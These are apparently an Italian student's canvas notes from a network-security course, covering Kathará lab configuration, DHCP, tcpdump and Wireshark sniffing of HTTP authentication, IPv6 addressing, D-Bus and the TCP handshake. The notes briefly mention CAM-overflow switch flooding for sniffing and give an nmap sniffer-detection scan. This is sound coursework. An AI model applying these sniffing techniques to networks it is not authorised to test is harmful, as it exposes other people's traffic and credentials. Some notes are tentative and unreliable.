		{"id":"2d824d6131fce094","type":"text","text":"# Laboratorio 1 - `IPv4` & Packet Sniffing\n\n### `Ex1`\n\nFacciamo `lstart`. Si aprono `4` terminali corrispondenti ai nodi di rete da configurare, che mostrano i `log` delle operazioni già effettuate su di essi (entrambi questi comportamenti, i.e. apertura automatica dei terminali e stampa dei `log`, sono configurabili in `kathara settings`). In particolare,\n\n- ai `pc` viene preventivamente annullata ogni configurazione di `IP` sull'interfaccia `eth0` con il comando `ip addr flush eth0`: andrà settata manualmente;\n\t- Ogni nodo viene creato simulando una macchina con una scheda di rete, quindi ogni nodo possiede a priori un'interfaccia `eth0`.\n- `r1` viene effettivamente settato da `router`:\n\t- `ip addr replace 192.168.100.30/29 dev eth0` - Qualunque configurazione ci fosse prima, il tuo nuovo indirizzo su `eth0` è `192.168.100.30`. Inoltre, da `eth0` puoi raggiungere tutta la sottorete con `subnet mask 255.255.255.248`, i.e. tutti gli indirizzi che vanno da `192.168.100.24` (che identifica la rete, se ti fai i conti ha tutti `0` come parte `host`) a `192.168.100.31` (che è invece il `broadcast`, parte host di tutti `1`). Quindi `.30` è l'ultimo indirizzo utilizzabile, ed è stato assegnato al `router`. Restano come potenziali `host` gli `IP` che vanno da `.25` a `.29`;\n\t- `iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE` - `r1` sarà connesso ad Internet tramite `eth1`, e su tale interfaccia eseguirà un `NAPT` per mascherare gli `IP` di tutte le altre sottoreti (in questo caso solo `eth0`);\n\nA questo punto, per settare una configurazione di rete funzionante servono quattro elementi: `IP`, `netmask`, `IP` del `default gateway` e `IP` del `server DNS`. Ci sono tre modi per farlo.\n\n1. `interfaces` (`pc1`) - Tutte e quattro le informazioni vengono messe su un unico file, i.e. `/etc/network/interfaces.d/eth0` (sarebbe `/etc/network/interfaces`, ma se lo apri ti rendi conto che semplicemente prende le configurazioni dai file presenti nella cartella `interfaces.d`). Ci devi scrivere una roba del tipo\n\n```python\nauto eth0                                     # Attiva eth0 all'avvio (altrimenti dovrei sempre farlo io manualmente con `ifup eth0`)\niface eth0 inet static                        # Specifica l'interfaccia in modo statico\n\taddress 192.168.100.25/29                 # Definisce l'IP e la subnet mask\n\tgateway 192.168.100.30                    # Il router r1 è il default gateway\n\tdns-nameservers 151.100.4.2 151.100.4.13  # Quelli definiti da r1, ma potrei in linea di principio mettere quelli che voglio\t\n```\n\n- Se non ti ricordi la sintassi, `man interfaces`. Per rendere effettivi i cambiamenti devo far leggere al kernel questo nuovo file `interfaces` aggiornato, con il comando `ifup eth0` (`ifup` va a cercare `eth0` dopo una definizione di `iface` nel file di configurazione). Per spegnere l'interfaccia, `ifdown eth0`.\n\t- Di norma `ifup` aggiorna automaticamente il file `/etc/resolv.conf`, dove vengono salvati gli indirizzi dei `server DNS`. Questo non succede se si usa Docker, <span style=\"color:rgb(236, 155, 14)\">perché `ifup` non ha i permessi per farlo</span> (e comunque verrebbe resettato ad ogni riavvio dell'ambiente Katharà). Va fatto a mano.\n\n2. `ip` (`pc2`) - I primi due si settano con `ip add`, il `default gateway` con `ip route` e il `DNS` va scritto a mano nel file `/etc/resolve.conf`;\n\n3. `ifconfig` (`pc3`) - È la vecchia versione del comando `ip`, quindi in modo analogo (con `route` al posto di `ip route`.... perché `ip` non c'era).\n\n### `Ex2`\n\nLa stessa cosa di prima, ma con `DHCP`.\n\n- `r1` va settato `server DHCP`. Si può fare con `udhcpd`, che ha un file `/etc/udhcpd.conf`. Dopo aver settato tutto (in fondo ci sta altra roba, occhio!) lo si lancia con `udhcpd -f /etc/udhcpd.conf` (lato client invece è `dhclient`). Qui per comodità invece di scrivere i comandi bash per modificare `udhcpd.conf` in `r1.startup` possiamo mettere il file di configurazione direttamente già scritto in `pc1/etc/udhcpd.conf`, `r1` lo caricherà direttamente all'avvio;\n\t- <span style=\"color:rgb(236, 155, 14)\">Questo è vero, ma sembra che la configurazione venga caricata sul nodo virtuale ***dopo*** che vengono eseguiti i comandi di startup. O meglio, se in `r1.startup` cerchi `udhcpd.conf` nel filesystem (tipo con `ls`) lui te lo trova, ma `udhcpd -f /etc/udhcpd.conf` eseguito subito dopo tra i comandi di `r1.startup` restituirà un errore di tipo \"`file non trovato`\". Boh, non voglio indagare, ci ho perso già troppo tempo. Tocca avviare il server a mano, altrimenti partirà con le impostazioni predefinite, quindi con i range di indirizzi sbagliati, e in pratica non funzionerà nulla</span>;\n- `pc1` di nuovo con `interfaces` (`iface eth0 inet dhcp`);\n- `pc2` con `dhclient`\n\n### `Ex3`\n\nQui tocca configurare due router. Tre, in realtà: bisogna mettere al router di frontiera le regole per raggiungere le reti interne.\n\nVisto che inizia ad esserci un botto di gente collegata ha senso iniziare a creare delle associazioni `IP-Hostname` in modo da non dover ogni volta scrivere `ping 172.16.1.2`. Questa roba si fa scrivendo nel file `/etc/hosts` coppie di tipo `172.16.1.1 lan1pc1` e simili. Gerarchicamente sta sopra DNS, i.e. queste associazioni vengono preferite a qualsiasi cosa dica il servizio di risoluzione dei nomi.\n\nOra aggiungiamo il ***packet sniffing***. Tramite `tcpdump` possiamo osservare il traffico direttamente da CLI, ad esempio\n\n- Eseguiamo `tcpdump -vvv` (molto `verbose`) su `lan1pc1` (dovrei a rigore mettere `-i eht0`);\n- Eseguiamo `ping lan1pc1` su `lan2pc2`.\n\nOltre agli ovvi messaggi `ICMP` e `ARP` (perché in ogni caso le entries della `ARP Table` hanno un `TTL` oltre il quale vengono cancellate), notiamo anche le richieste per una ***reverse DNS lookup***, i.e. una ricerca `DNS` \"al contrario\" in cui dispongo di un `IP` ma non del nome associato. In questo caso succede perché gli abbiamo detto `nameserver 8.8.8.8`, ma non il nome di questo `IP`:\n```python\ndns.google.domain > lan1pc1.54520: [udp sum ok] 9244 q: PTR? 8.8.8.8.in-addr.arpa. 1/0/0 8.8.8.8.in-addr.arpa. [23h36m6s] PTR dns.google.\n```\n\n`dns.google.domain` risponde a `lan1pc1` sulla porta `54520` con un pacchetto `UDP` non corrotto (il `checksum` è `ok`) per la richiesta `#9244` che chiede una `reverse DNS query` (`PTR?`, che a quanto ho capito sta per `pointer`) su `8.8.8.8` (il suffisso `.in-addr.arpa.` è uno standard per intendere che quello a cui è attaccato è l'oggetto della `reverse DNS query`). Seguono il `TTL` e la risposta col nome (`PTR dns.google.`). Nota che tutti questi messaggi vengono visti ugualmente in chiaro da `lan1pc2`, in quanto connesso alla stessa LAN priva di switch.\n\nSegue ***Wireshark***. Per capire come configurarlo (e perché) cfr. `Wireshark` su `Katharà`.\n\n### `Ex 4`\n\nQui l'idea è catturare il traffico di un `local webserver`. La topologia di rete prevede che `pc1` sia connesso su due reti: `172.17.0.2/16` è dovuto alla direttiva `pc1[bridged]=true`, il che è un `bridge Docker` che lo collega al resto del mondo (i.e. alla VM sottostante, che è a sua volta connessa al SO sottostante, che è a sua volta connesso ad Internet), mentre `10.0.0.1/24` è la `LAN A`. Se eseguiamo `connect-lab.sh 10.0.0.100/24 lanA` siamo connessi con la VM su una `LAN` su cui è in ascolto un server sulla `porta 80`: possiamo fare richieste `HTTP` da `Firefox` (o qualsiasi altro `browser`) e sniffare con `Wireshark`.\n\nSniffiamo i pacchetti scambiati chiedendo da `browser` la pagina `http:://10.0.0.1/ba.php`, che implementa una `Basic Authentication`. Vediamo lo scambio `SYN - SYN ACK - ACK` per l'`handshaking TCP`, la `GET` per il contenuto della pagina, dopodiché ho sbagliato a mettere la `password`, quindi mi ha rifiutato con codice `401` e ha chiuso la connessione con le varie `FIN ACK`. Se invece ci limitiamo a visualizzare la pagina `10.0.0.1`, `TCP` manterrà la connessione attiva scambiando periodicamente dei `Keep-Alive`. Se metto la giusta `password` cambia poco, semplicemente il codice diventa `200` e non vedo nient'altro: l'autenticazione è per definizione inclusa nella richiesta `GET`. Su `Wireshark`, posso selezionare un pacchetto `HTTP` e da tasto destro scegliere `Follow > HTTP (or TCP) Stream`. Questo mostra la ricostruzione del flusso di messaggi effettivi scambiati da quella connessione, ne riporto esempi a sinistra. Stesso dicasi per la pagina `da.php` che implementa la `Digest Authentication`.\n\nDopodiché chiede la stessa cosa con `FTP`, i.e. dal `pc1` eseguo `ftp test.rebex.net` mettendo credenziali `demo:password`. Nota che così `pc1` va su Internet senza passare per la `lanA`, quindi o guardo con `Wireshark` direttamente al traffico in uscita dalla VM oppure catturo su `pc1` con `tcpdump`, salvo su `shared` e poi apro con `Wireshark`. Notiamo alcune cose: `FTP` è un protocollo stateful, i.e. la connessione resta aperta finché non la chiudiamo, e separa il flusso di comandi ed il flusso di dati, e.g. visibile se chiamiamo una funzione `get`. Inoltre, sempre con la `get`, notiamo che un singolo comando nella nostra interfaccia client esegue diverse richieste a livello di pacchetti `FTP`.\n\nInfine, facciamo la stessa cosa con `SFTP` e notiamo che si appoggia su `SSHv2`, motivo per cui risulta tutto crittato.","x":-9570,"y":8600,"width":1259,"height":2425,"color":"4"},
		{"id":"6dcfdc201d597c93","type":"text","text":"# alternativa\n\ninvece di mettere i comandi bash in .startup, posso mettere i file di configurazione in pc1/etc/network/eccetera, e mettere in pc1.startup la linea `etc/init.d/networking restart`\n\nNOOO NON CREDO, CAPIRE MEGLIO\n\n\nse devo copiare un file da dentro un nodo (e.g. r1) a fuori, nel terminale standard `docker cp r1:/path/to/file ./file.conf`\n","x":-4280,"y":9305,"width":557,"height":367},
		{"id":"9c512660e25af682","type":"text","text":"# `AF_UNIX` - Inter-Process Communication (IPC)\n\nSe vuoi costruire condivisione di informazioni tra processi in modo più sofisticato rispetto ad un file condiviso o a semplici segnali, puoi usare una sorta di paradigma ***client-server*** che si appoggia sui ***Bus*** e che su di essi apre dei ***Socket UNIX*** (`AF_UNIX`).\n\nSi può fare un'analogia con le reti:\n\n- Il `bus` è l'analogo di ***Internet***: tutti si possono collegare ad esso per inviare o per ricevere messaggi. Ne abbiamo diversi (e.g. `session` per i processi utente, `system` per quelli di sistema), e in pratica costituisce l'architettura della \"LAN\";\n- I processi che vogliono inviare/ricevere messaggi sono l'analogo di ***client e server***. Servono quindi due cose:\n\t- Ad ogni processo connesso al `bus` viene assegnato un nome univoco temporaneo (e.g. `:1.42`) che funge da ***indirizzo IP***. Se però il processo (e.g. `standardservice`) offre un servizio molto specifico (e.g. `Sum`) può scegliere di esporsi alla \"LAN\" usando come identificativo un ***well-known-name*** che richiama un \"well-known-service\" (e.g. `standardservice.Sum`). Questo significa che gli altri processi possono accedere ai servizi standard indipendentemente da chi è lo specifico processo che lo implementa (sarebbe un disastro con i nomi casuali!);\n\t\t- In pratica, `org.freedesktop.NetworkManager` è un well-known-name di un processo che si pubblicizza come `NetworkManager` e che offre metodi come `ActivateConnection(parametri)` e `GetActiveConnections()` secondo gli standard definiti da `org.freedesktop` (essendo i nomi gerarchici come `DNS`, visitando il sito `freedesktop.com` ti rendi conto che è letteralmente un progetto che definisce standard per cose su `UNIX`);\n\t\t- Con un ***codice malevolo*** potrei pubblicizzarmi come voglio e fare quello che voglio? ... ***ni***. `DBus` ha delle contromisure, messe in atto da `dbus-demon`. Ad esempio, per presentarti come `NetworkManager` ti servono le autorizzazioni;\n\t\t- Il nome casuale `:1.42` è gestito in modo incrementale per evitare conflitti.\n\t- Dopo l'`IP`, su `TCP/IP` mi serve la ***porta***. Ma l'obiettivo è solo quello di identificare un servizio offerto! Segue che qui l'analogo delle porte sono i metodi esposti dal processo che si pubblicizza sul `bus`. In pratica uso il nome del servizio e attacco in coda il metodo (e.g. `org.freedesktop.NetworkManager.GetActiveConnections`).\n- In `TCP/IP`, La coppia `IP/Porta` crea di fatto un ***socket***. Qui è leggermente diverso. Il demone `dbus` crea un socket associato al bus e si propone come server per tutti i processi. I processi si connettono come client e specificano chi vogliono raggiungere (tramite well-known-name o nome univoco temporaneo). Di fatto, per mantenere il parallelismo con `TCP/IP` per ogni connessione tra due processi abbiamo in realtà due connessioni client-server (`Processo A - dbus` e `dbus - Processo B`). Di fatto, quindi, `dbus` fa sia (de)multiplexing sia \"***routing***\".\n\nQuesto era per rispondere a \"uuh cosa sono tutte queste cose quando eseguo `ss -x`?!\".\n\nE fu così che non si laureò mai...","x":-6043,"y":8600,"width":759,"height":1105,"color":"4"},
		{"id":"394c80713ed11e62","type":"text","text":"# Address Families & Tipi di Socket\n\nAbbiamo capito che un ***socket*** è un'astrazione generale per la comunicazione. A seconda del tipo di comunicazione, possiamo trovare diverse ***famiglie di socket***. Quando ad esempio apro un socket `UDP` in `python` tramite la libreria `socket` e il comando\n\n```python\nclientSocket = socket(AF_INET, SOCK_DGRAM)\n```\n\n`AF_INET` sta dicendo che questo socket sarà usato per comunicare su `IPv4` (`AF_INET6` avrebbe usato `IPv6`), e `SOCK_DGRAM` significa protocollo `UDP`. \n\nSi può intuire che esistono un botto di famiglie di socket. Per citarne alcune:\n\n- `AF_INET(6)` - Usata per ricevere messaggi applicazione basati su `TCP/IP`;\n- `AF_PACKET` - Usata per ricevere frame Ethernet grezzi (cfr. ***Packet Sniffing***);\n- `AF_NETLINK` - Usata per la comunicazione User-Kernel (i.e. ***system call***);\n- `AF_UNIX` (o `AF_LOCAL`) - Usata per implementare ***Inter-Process Communication*** (***IPC***);\n- `AF_BLUETOOTH` - Autoesplicativo. Ci sono in generale tante famiglie di socket quanti sono i protocolli di comunicazione.\n\nA volte al posto del prefisso `AF_` (`Address Family`) si usa `PF_` (`Protocol Family`). In teoria il primo si usa a livello astratto (i.e. quando lo chiamo nel codice), mentre con il secondo si indica la sua implementazione all'interno del `kernel`. In pratica, sono sinonimi.","x":-7052,"y":8853,"width":759,"height":600,"color":"6"},
		{"id":"6f55ee57ba880979","type":"text","text":"# `ps` & `ss` (`Processi` e `Socket`)\n\nIl comando `ps` (`Process Status`) serve a visualizzare i ***processi*** in esecuzione. Eseguito senza ulteriori opzioni mostra tutti i processi legati alla `shell` corrente (simile a `jobs`, ma quest'ultimo mostra solo quelli in background). Dopodiché abbiamo\n\n- `-e` (analogo a `--all`) - Mostra tutti i processi;\n- `-f` - Mostra il formato completo (`PPID`, `CPU Time`, ...);\n\t- `-l` estende ulteriormente.\n- `-u user` - Mostra solo i processi dell'utente `user`;\n- `-p PID` - Mostra i dettagli del processo con un certo `PID`;\n- `-t tty` - Mostra i processi associati ad uno specifico terminale `tty`;\n- `a` - Mostra i processi di tutti gli utenti con un terminale attivo;\n- `x` - Mostra anche i processi senza terminale, ma dell'utente corrente;\n\t- `ax` mostra tutti i processi, come `-e` e `--all`.\n- `u` - Estende le informazioni (mostra più colonne).\n- `f` (analogo a `--forest`) - Mostra l'albero gerarchico dei processi;\n- `--sort=-%XXX` - Ordina secondo `XXX = cpu` (uso della `CPU`) o analogo con `mem`.\n\nGiocando con questa roba potresti ad esempio accorgerti che c'è un processo, i.e.\n```\n/lib/systemd/systemd --user\n```\nche è il padre di tutti i processi utente. Questo perché gestisce `systemctl --user`, i.e. ti permette di usare i servizi nello spazio utente. Con `ps --forest -u user` puoi vedere rapidamente tutti i servizi attivi di `user`.\n\nIl comando `ss` (`Socket Statistics`) ispeziona invece tutte le possibili ***connessioni***.\n\n- `-a` - Mostra tutti i socket\n- `-t`, `-u` - Filtra, rispettivamente, le sole connessioni `TCP`/`UDP`;\n- `-x` - Filtra le sole connessioni `UNIX`, cfr. ***Inter-Process Communication (IPC)***;\n- Oltre a queste due macro-categorie (`TCP/UDP` e `UNIX`) ne esistono altre:\n\t- `RAW` - Accesso diretto a `IP`. Alcuni comandi (e.g. `ping`, `tcpdump` e i firewall) non usano il livello di Trasporto;\n\t- `FRAG` - Usata per gestire i `frammenti IP` non ancora ricomposti;\n\t- `INET` - Generica connessione di rete, i.e. qualsiasi cosa non meglio specificata che coinvolga `IP` (e che quindi non sia locale, come invece è una connessione `UNIX`).\n- `-l` - Mostra solo i socket in ascolto;\n- `-n` - Mostra gli `IP` in formato numerico (non risolve i nomi);\n- `-p` - Mostra il nome del processo associato al socket;\n- `-s` - Mostra un riassunto statistico delle connessioni.","x":-8061,"y":8600,"width":759,"height":1105,"color":"4"},
		{"id":"6033fbd5014b0cba","type":"text","text":"# PND 27/02\n\n6o67wtg\n\nACME è una rete virtuale in ambiente sapienza sulla quale implementare le cose del corso (sulla quale girano circa 15 VM). Usa una VM con Katharà, NON fare sta roba sul pc direttamente perché esplode tutto\n\ncompleteness\ncorrectness\neffort (scrivi più di 1-2 pagine nel report, che sennò si incazza)","x":-19552,"y":5957,"width":759,"height":360},
		{"id":"e5fc1848775e11e1","type":"text","text":"## continua lec 1\n\n- find - looks for files (by name, size, ...)\n- la shell ha comandi interni ad essa ed esterni. con `which ls` trovi il percorso dei comandi esterni (se è interno non restituisce niente). `ls` è esterno\n- `man comando` restituisce il manuale di `comando`.\n- `apropos comando` ti dice cosa fa `comando`\n- `info comando` è la vecchia versione di `man comando`, ma su editor (man è su terminale)\n- `alias` restituisce tutte le shortcut alternative per i comandi\n\t- `ll` è `ls -afD`, se fai `ll /proc/` ti escono cose che non sono né `d` (directory) né `-` (file), ma `c` (??) o `s` (file compresso??) \n- cosa sono i gruppi `shadow` e `dialout` ???\n- s al posto di x = prima dell'esecuzione cambia la proprietà del file. `which passwd` e poi `ll /output/passwd` (vedrò la `s` sull'user, quando lo esegue il possesso passa a root). Vedi rec\n\t- mi sa che devi chiedergli cosa recuperare... SO2?\n\n`shadow` sono le password pare, e sono separate dal file `passwd`!!\nQuella NON è una RegEx!! è una EXPANSION del bash\n\n`for i in 'la -1 *a.txt'; do echo $i.backup; done`\n\nfa un backup di ....... guarda la rec. link simbolici con `ln`. \n\nanche per una parte sui permessi, è circa l'una e mezza \n\n`cat` = concatenate (cerca le motivazioni dietro ai comandi!!!)\n\n`echo '3 is a number' | wc -w | tr '[0-9]' '[n-z]'` che fa sta roba?\n\n- echo manda in output la frase\n- la prende word count (wc) con opzione -w (conta sola le parole), quindi restituisce 4\n- tr.....\n\n128 è 10000000....","x":-19552,"y":6397,"width":759,"height":858},
		{"id":"213cb7424970c6c4","type":"text","text":"# Lec 28/02\n\nfuzzy attack?\n\nwireshark e simili modificano direttamente la NIC per entrare in promiscuous mode? questa cosa diventa difficile se la rete è segmentata (faccio diverse VLAN? o comunque lo switch è più intelligente del previsto e manda la roba solo al vero destinatario)\n\nARP requests are always broadcast ethernet packets\n\nposso collegare uno switch ad un altro switch. questo significa che ad una porta possono corrispondere più MAC\n\nARP tables for hosts, called CAM for switches (HW-based, so fast. in fact, destination is the very first info in ethernet so that switch can decide output port asap)\n\n- CAM overflow - costringo lo switch a non ricordarsi le cose in modo da fargli fare broadcast ogni volta (mi interessa per fare sniffing, altrimenti i packet non mi arrivano!)\n\nInternet non è una grande ethernet network perché sta roba si basa sui broadcast. per risolvere questo problema crei IP. similmente a come poi visto che è inefficiente fare routing su cose troppo grandi dividi in ISP (e poi BGP ecc)\n\nSapienza è connessa a GAR (?) che collega tutte le università italiane\n\nbroadcast su IP poco comune (satelliti, ping), di norma si ignora (per ovvi motivi). multicast più comune, specie su IPv6\n\nClassi ABCDE: guarda il primo 0. \n\n- A - 0xxxxxxx fino a 127\n- B - 10xxxxxx da 128 a 191, ecc...\n- C\n- D - 1110xxxx (multicast)\n- E - (unused) 111110xx\n\nnon si usa più perché la classe A è troppo grande, quindi CIDR (parte network e parte host)\n\nprivate networks (RFC1918, i.e. non-routable IPs) definisce 10.xxx.xxx.xxx, 172.16.xxx.xxx e 192.168.xxx.xxx (guarda slide 34)\n\nbroadcast è sempre \"tutti 1 nella host part\", anche se questo non produce in generale in CIDR un 255!","x":-18632,"y":6328,"width":759,"height":997},
		{"id":"399d0f8bfe3f80d5","type":"text","text":"# IPv6 - 07/03\n\nad oggi abbiamo finito gli IPv4, e ne allochiamo di nuovi solo se qualcuno li restituisce a IANA. \n\nIoT con IPv6?\n\nIPv6 ha $\\sim 3.4\\cdot 10^{38}$ (o alla 36?) indirizzi. In teoria risolve la necessità di usare il NAT. Ogni hex sono 4 bit. 128 bit sono 32 esadecimali in 8 gruppi da 4. parte di rete e parte di host sono simmetriche (16 e 16 hex - sì, ma per essere precisi i primi 3 gruppi sono network, il quarto per la sottorete e gli altri gli host). huge amount of hosts, questo protegge gli host perché enumeration diventa difficilissimo (ci metti ordine secoli).\n\n:: comprime intere stringhe di 0. Non ogni singolo blocco da 4 hex!: cioè non si trova `AB::::CD:1200::10`, si comprime solo la più lunga (e se ce ne sono due uguali si comprime solo la prima). Quindi posso avere `2001:DB8:1000::1` (meaning `2001:DB8:1000:0:0:0:0:1`, typical exam question)\n\nslide 25 (ignora anycast) - no broadcast, diventa multicast\n\n- global unicast = identico a ipv4\n- link local sono usati solo in un link interno alla rete. ogni coppia che comunica in locale ha una coppia di ipv6.\n- unique local = indirizzi privati di ipv4\n- embedded ipv4 - retrocompatibilità\n\n\n","x":-17663,"y":6514,"width":759,"height":625},
		{"id":"1aee8251fddfc28d","type":"text","text":"# Wireshark Lab - 07/03\n\nhijacking\n\nalternative per sniffare traffico\n\n- dumpcap solo capture dei packet, no analysis\n- tcpdump less flexible than wireshark (no display filter, no GUI)\n- netflow - non fa deep packet inspection, fa solo un sommario di quello che sta succedendo (conta i pacchetti, i byte, RTT, ...)\n- ne ha saltato uno\n\nsono tutti basati sulla libreria `pcap`.\n\nl'idea di wireshark è di dissezionare il pacchetto e trovare i limiti del frame (DLL), segmento (Trasporto), pacchetto (Applicazione).\n\nè scemo, nel senso che se vede una roba su porta 80 prova a dissezionarlo pensando sia http. il che ha senso, ma puoi fregarlo usando porte non standard.\n\ndue tipi di filtri\n\n- capture - quelli esclusi dal filtro vengono proprio persi\n- display - quelli esclusi non vengono mostrati (ma ws li ha presi!)\n\nberkley packet filter (BPF) syntax\n```\nprotocol(tcp, ip6, ...) direction (src, dst) type\n```\ncon `type` puoi fare N cose, tra cui operatori e simili. vedi slides\n\n","x":-16872,"y":6448,"width":759,"height":757},
		{"id":"446577bee9616f15","type":"text","text":"# IPv6 II - 14/03\n\nmulticast\n- assigned - per protocolli x (qualsiasi indirizzo che inizia per `FF`)\n- solicited - ICMPv6 sostituisce ARP (che usa broadcast) con neighbour discovery. 24 bit per gli hosts\n\nunicast\n- global unicast - `2000::/3` significa che i primi 4 bit sono `0010`. Questo significa che gli indirizzi di global unicast iniziano con i ***bit*** `001`, quindi il primo quartetto di ***bit*** è `2 (0010)` o `3 (0011)`. Quindi il primo quartetto di ***hex*** va da `2000` a `3FFF`.\n\t- il global unicast rappresenta 1/8 del totale degli indirizzi! un'altra fetta di torta è divisa tra tutti gli altri \"protocolli\", il resto è inutilizzato;\n\t- Dico un ottavo perché con `/3` bit conti fino ad 8. Con la stessa logica un gruppo `/10` è un $2^{10}$-esimo del totale.\n\t- fanno sostanzialmente le veci degli indirizzi pubblici in IPv4\n- unique local - `FC00::/7` - corrispondono agli indirizzi privati in IPv4 (192.168.x.x, ...).\n\nil source IPv6 è sempre unicast, la destinazione qualsiasi (obv).\n\n`2001:DB8::/32` sono usati per giocare, mai su internet\n\nglobal routing prefix (la parte di rete), subnet ID, interface (host) - rule 3 1 4: incrementa di 1 il quarto quartetto di hex e cambierai sottorete entro la stessa rete\n\ne comunque è diviso a metà tra rete e host\n\nci sono talmente tanti indirizzi che potresti usarne uno diverso per ogni richiesta (che senso ha???? potrebbe averlo detto solo come esempio)\n\n\n\n##### link-local\n\nlink-local è solo entro rete/sottorete (tipo il MAC, infatti sei costretto ad averne almeno uno). Non attraversano il router. Pertanto, devono essere unici entro la rete (...come gli indirizzi privati. ma allora cosa cambia con unique local???). range da `FE80` a `FEBF`.\n\nPer questo qualsiasi interfaccia IPv6 ha sempre un indirizzo associato che inizia con `fe80` o simili entro range. `fe80` è self assigned, altrimenti gli altri sono per applicazioni specifiche. Tipicamente dopo `fe80` gli altri N sono tutti 0. Ma come genero una roba unica?\n\n- EUI-64 genera un IPv6 basandosi sulla NIC (tipo sul suo MAC, che in teoria è unico. OUI sono vendor-specifici e Device... sono per il device). Aggiunge `FFFE` in mezzo al mac, se lo vedo so che è EUI-64. poi flippa il 7mo bit (\"don't ask why\");\n- random (su 64 bit è improbabile fare la stessa scelta... speriamo!). Molti SO fanno così\n\naltrimenti manuale (common practice for routers).\n\nquesto link-local è cruciale per assegnare un global unicast address con il protocollo SLAAC (self assignment within the network): quando mi connetto, il router mi manda al link local un messaggio tipo `ciao, sono il gateway, auto-assegnati un ipv6 globale pls`. In pratica questo sostituisce DHCP.\n\n- riassumendo: mi connetto e mi auto-assegno un ip link-local ipotizzando sia unico (probabile). il router mi vede e si presenta, dicendomi che voglio comunicare con l'esterno devo passare da lui, ma in caso mi devo  assegnare un indirizzo globale.","x":-16012,"y":6150,"width":759,"height":1353},
		{"id":"86afbb36e3ee27dc","type":"text","text":"# SPACING","x":-5284,"y":10143,"width":250,"height":235,"color":"5"},
		{"id":"be38eea5ec0fbd77","type":"text","text":"# Handshaking TCP (Reti di Elaboratori)\n\nIl server configura un ***welcome socket*** su una coppia `(IP, porta)` predefinita per eseguire l'handshaking. Quando il client manda una richiesta di connessione al welcome socket, vengono concordati i ***parametri di connessione***. Se va tutto bene, la connessione viene spostata su un altro server socket *ad-hoc*, e il welcome socket torna in ascolto.\n\nTCP usa un ***3-Way Handshaking***:\n\n- Il ***client*** sceglie un proprio numero di sequenza casuale `x` da cui partire e invia un segmento con il bit `SYN = 1` (sincronizzazione, ovvero \"`voglio stabilire una connessione`\"), ed entra in uno stato `SYNSENT` (***richiesta inviata***);\n\t- Generare un ***Initial Sequence Number*** (***ISN***) `x` difficilmente indovinabile è cruciale per la sicurezza, come spiegato nel riquadro a fianco. In origine TCP usava modi poco robusti (e.g. `timestamp x costante` o `hash(IP, porta)`), e quindi facilmente indovinabili con brute-force, ma recentemente si sono prese migliori contromisure (e.g. migliore randmizzazione, firewall, `SYN Cookies` e validazioni profonde).\n- Il ***server*** sceglie un proprio numero di sequenza casuale `y` da cui partire e risponde con un messaggio di tipo `SYNACK` (`SYN = 1`, sono in fase di handshaking, `ACK = 1`, sto mandando un `ACK`, `ACK# = x + 1`, mandami il numero di sequenza `x + 1`). Il server entra in uno stato `SYNRCVD` (***richiesta ricevuta***);\n- Il ***client*** riceve `SYNACK`, sa che il server c'è. Invia un `ACK` chiedendo `y + 1` e può contestualmente iniziare a trasmettere: per lui la connessione è `ESTAB` (***established***);\n- Il server riceve l'`ACK`, sa che il client c'è: anche per il server la connessione è `ESTAB`. Il welcoming socket procede a chiamare `accept()`, i.e. la `syscall` che sposta la connessione dal welcome socket a quello definitivo.\n\nChi vuole chiudere una connessione TCP invia un segmento con il flag `FIN = 1`. Se l'altra risponde con un `FIN ACK`, questo sancisce la chiusura di \"mezza\" connessione (i.e. una delle due parti ha chiuso la connessione). L'altra mezza verrà chiusa una volta che il sender originale avrà ricevuto il `FIN ACK`.","x":-3600,"y":9908,"width":759,"height":924,"color":"4"},
		{"id":"3e59a8434e7f1e95","type":"text","text":"# Esempi avanzati di `nmap`\n\n```bash\n# Prova ad individuare uno sniffer sulla LAN 192.168.1.0/24\nnmap --script=sniffer-detect -Pn -n 192.168.1.0/24\n```\n\n","x":8875,"y":-1249,"width":759,"height":848},
		{"id":"5ddd43db34c02b27","type":"text","text":"# `Wireshark` su `Katharà`\n\n`tcpdump` mostra le cose in modo \"straightforward\" da linea di comando, mentre per usare Wireshark serve una GUI. Visto che i terminalini non ce l'hanno, dobbiamo usarlo sulla VM, al di fuori dell'ambiente Katharà. Eh ok, ma allora come faccio a sniffare i pacchetti? Semplice, creo un collegamento ***ethernet virtuale*** (`veth0`) che collega una mia interfaccia sulla VM alla `LAN` simulata da docker. Come? Con lo script `connect-lab.sh`! Come?\n\n- Creo le due interfacce virtuali, i.e. gli estremi del cavo ethernet virtuale (`sudo ip link add veth1 type veth`).\n\t- \"Ma hai specificato solo `veth0`, ti manca un'interfaccia!\". No, non manca, la genera il SO in automatico dandole un nome coerente (e.g. `veth0`);\n\t- Puoi specificare esplicitamente entrambi i nomi con `ip link add dev veth0 type veth peer name veth1`.\n- Assegno a `veth0` l'`IP` passato come primo argomento (`sudo ip addr add $1 dev veth0`);\n\t- Ovviamente devo dargli un indirizzo coerente con la LAN a cui mi sto attaccando (e.g. se voglio andare sulla LAN `internal` dell'`Ex3` ha senso scegliere un indirizzo tipo `172.16.254.10/24`).\n- A questo punto devo rendere `veth1` una delle \"porte\" della LAN creata da Katharà. Uso questo termine perché questa rete è un `bridge`, i.e. si comporta da ***switch virtuale*** (è ragionevole che una LAN virtuale si comporti da switch, altrimenti sarebbe come collegare tutto su un singolo cavo ethernet). Per farlo, servono due step:\n\t- Anzitutto devo ***trovare la LAN*** tra quelle che risultano come output di `sudo docker network ls | grep -e 'kathara_.*'`. Lo script prevede un secondo parametro opzionale per specificarne il nome. Se non specifico nulla, lo script assume che ce ne sia solo una e prende la prima;\n\t- Una volta trovata, eseguo l'accoppiamento ***master/slave*** vero e proprio (`sudo ip link set veth1 master kt-${bridge}`).\n\t\t- Una `master interface` (e.g. la LAN creata da Katharà) è un dispositivo che gestisce altre interfacce subordinate (`slave`, e.g. `veth1`).\n- Infine, attiviamo le interfacce con `ip link set vethX up`.\n\nQuindi, dopo aver settato la rete facciamo `./connect-lab.sh 172.16.254.10/24 internal`, e vediamo se funziona provando a mandare un ping.\n\n... o meglio, sarebbe bello riuscire a rilevare la presenza di uno ***sniffer passivo*** in modo così semplice. La verità è che è quasi impossibile, perché questo non ha motivo di rispondere a nulla. Esistono tecniche per provare a individuare messaggi anomali che possano tradirne la presenza (e.g. mando pacchetti ad indirizzi inventati, lo sniffer vede questi `IP` che non conosce e prova a fare un reverse DNS lookup per capire chi sono, io sniffo a mia volta e vedo tali pacchetti), ma resta un compito difficile.","x":-8061,"y":11248,"width":759,"height":1105,"color":"4"},
